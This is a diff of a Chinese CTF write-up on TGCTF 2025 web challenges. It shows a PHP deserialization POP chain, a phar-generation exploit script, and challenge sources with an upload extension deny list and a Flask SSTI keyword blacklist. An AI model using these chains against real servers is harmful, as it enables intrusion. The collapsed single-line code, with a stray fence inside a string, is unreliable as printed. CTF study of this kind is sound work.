@@ -7,6 +7,7 @@ author: Xendr1a
 ---
 
 
+
 TGCTF 2025 web(复现
 
 日期：2025-06-01 21:16:23
@@ -44,7 +45,8 @@ public function __call($arg1, $arg2)        {            $this->done = "And what
 PHP在计算MD5哈希前会将对象转换为字符串，所以会自动调用 future类的__toString 方法那我们现在构造
 
 ```php
-<?phpclass yesterday {    public $study;}class today {    public $doing;}class future {}$future = new future();$today = new today();$today->doing = $future;$yesterday = new yesterday();$yesterday->study = $today;echo serialize($yesterday);?>O:9:"yesterday":1:{s:5:"study";O:5:"today":1:{s:5:"doing";O:6:"future":0:{&#125;&#125;}
+<?php
+class yesterday {    public $study;}class today {    public $doing;}class future {}$future = new future();$today = new today();$today->doing = $future;$yesterday = new yesterday();$yesterday->study = $today;echo serialize($yesterday);?>O:9:"yesterday":1:{s:5:"study";O:5:"today":1:{s:5:"doing";O:6:"future":0:{}}}
 ```
 
 然后看到
@@ -68,7 +70,11 @@ if (file_exists($_GET['filename'])){        echo "Focus on the previous step!<br
 我们先生成个phar.phar
 
 ```php
-<?phperror_reporting(0);class yesterday {    public $learn;    public $study="study";    public $try;    public function __destruct()    {        // echo "You studied hard yesterday.<br>";        return $this->study->hard();    &#125;&#125;class today {    public $doing;    public $did;    public $done;    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        // echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    &#125;&#125;class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __toString(){        // echo "This is your future.<br>";        # system($_POST["wow"]);        return "win";    &#125;&#125;@unlink("phar.phar");$phar = new Phar("phar.phar");$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>");$a = new yesterday();$b = new today();$c = new future();$a->study = $b;$b->doing = $c;$phar->setMetadata($a);$phar->addFromString("test.txt", "test");$phar->stopBuffering();?>
+<?php
+error_reporting(0);class yesterday {    public $learn;    public $study="study";    public $try;    public function __destruct()    {        // echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        // echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __toString(){        // echo "This is your future.<br>";        # system($_POST["wow"]);        return "win";    }}@unlink("phar.phar");$phar = new Phar("phar.phar");$phar->startBuffering();$phar->setStub("
+
+```php
+<?php __HALT_COMPILER(); ?>");$a = new yesterday();$b = new today();$c = new future();$a->study = $b;$b->doing = $c;$phar->setMetadata($a);$phar->addFromString("test.txt", "test");$phar->stopBuffering();?>
 ```
 
 生成了phar.phar，然后发现phar被过滤了，结合robots.txt的提示，我们爆破出后缀为atg
@@ -104,7 +110,8 @@ AAA偷渡阴平（复仇）
 我们扫到了index.php.bak和upload.php.bak
 
 ```php
-<?phpdefine('UPLOAD_PATH', __DIR__ . '/uploads/');$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess");        if (isset($_GET['name'])) {            $file_name = $_GET['name'];        } else {            $file_name = basename($_FILES['name']['name']);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['name']['tmp_name'];            $file_content = file_get_contents($temp_file);            if (preg_match('/.+?</s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = '文件上传成功！';                } else {                    $msg = '上传出错！';                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = '禁止保存为该类型文件！';            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';        $status_code = 404; // 404 表示资源未找到    &#125;&#125;// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    'status_code' => $status_code,    'msg' => $msg,]);
+<?php
+define('UPLOAD_PATH', __DIR__ . '/uploads/');$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess");        if (isset($_GET['name'])) {            $file_name = $_GET['name'];        } else {            $file_name = basename($_FILES['name']['name']);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['name']['tmp_name'];            $file_content = file_get_contents($temp_file);            if (preg_match('/.+?</s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = '文件上传成功！';                } else {                    $msg = '上传出错！';                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = '禁止保存为该类型文件！';            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';        $status_code = 404; // 404 表示资源未找到    }}// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    'status_code' => $status_code,    'msg' => $msg,]);
 ```
 
 我们看到
@@ -139,11 +146,12 @@ hint：有一个由4个小写英文字母组成的路由，去那里看看吧，
 
 上面那个是非预期吧，然后我们接着这个读取继续做，我们读取/app.py
 
-import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=['{','}','popen','os','import','eval','_','system','read','base','globals']def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route('/')def home():    return send_from_directory('static', 'index.html')@app.route('/jingu', methods=['POST'])def greet():    template1=""    template2=""    name = request.form.get('name')    template = f'{name}'    if waf(name):        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹<br>'    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧<br><br>再去西行历练历练<br><br>'                return render_template_string(template)            template1 = "“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”<br>最后，如果你用了cat，就可以见到齐天大圣了<br>"            template= template.replace("直面","&#123;&#123;").replace("天命","&#125;&#125;")            template = template    if "cat" in template:        template2 = '<br>或许你这只叫天命人的猴子，真的能做到？<br><br>'    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f"500报错了，查询语句如下：<br>{template}"        return error_message, 400@app.route('/hint', methods=['GET'])def hinter():    template="hint：<br>有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!"    return render_template_string(template)@app.route('/aazz', methods=['GET'])def finder():    filename = request.args.get('filename', '')    if filename == "":        return send_from_directory('static', 'file.html')    if not filename.replace('_', '').isalnum():        content = jsonify({'error': '只允许字母和数字！'}), 400    if os.path.isfile(filename):        try:            with open(filename, 'r') as file:                content = file.read()            return content        except Exception as e:            return jsonify({'error': str(e)}), 500    else:        return jsonify({'error': '路径不存在或者路径非法'}), 404if __name__ == '__main__':    app.run(host='0.0.0.0', port=80)
+```python
+import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=['{','}','popen','os','import','eval','_','system','read','base','globals']def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route('/')def home():    return send_from_directory('static', 'index.html')@app.route('/jingu', methods=['POST'])def greet():    template1=""    template2=""    name = request.form.get('name')    template = f'{name}'    if waf(name):        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹<br>'    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧<br><br>再去西行历练历练<br><br>'                return render_template_string(template)            template1 = "“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”<br>最后，如果你用了cat，就可以见到齐天大圣了<br>"            template= template.replace("直面","{{").replace("天命","}}")            template = template    if "cat" in template:        template2 = '<br>或许你这只叫天命人的猴子，真的能做到？<br><br>'    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f"500报错了，查询语句如下：<br>{template}"        return error_message, 400@app.route('/hint', methods=['GET'])def hinter():    template="hint：<br>有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!"    return render_template_string(template)@app.route('/aazz', methods=['GET'])def finder():    filename = request.args.get('filename', '')    if filename == "":        return send_from_directory('static', 'file.html')    if not filename.replace('_', '').isalnum():        content = jsonify({'error': '只允许字母和数字！'}), 400    if os.path.isfile(filename):        try:            with open(filename, 'r') as file:                content = file.read()            return content        except Exception as e:            return jsonify({'error': str(e)}), 500    else:        return jsonify({'error': '路径不存在或者路径非法'}), 404if __name__ == '__main__':    app.run(host='0.0.0.0', port=80)
 
-看到了这个from a.b.c.d.secret import secret_key可以发现后面会将直面天命变成&#123;&#123;&#125;&#125;
+看到了这个from a.b.c.d.secret import secret_key可以发现后面会将直面天命变成{{}}
 
-template= template.replace("直面","&#123;&#123;").replace("天命","&#125;&#125;")
+template= template.replace("直面","{{").replace("天命","}}")
 
 最后我们就可以构造payload了
 
@@ -156,6 +164,7 @@ TG_wordpress
 火眼辩魑魅
 
 扫到了robots.txt
+```
 
 ![rId58.png](/img/TGCTF-2025-web-复现/rId58.png)
 
@@ -174,4 +183,5 @@ TG_wordpress
 小结
 
 还有几道题后面再补了，有点难，后面再补了...(待续
+
 
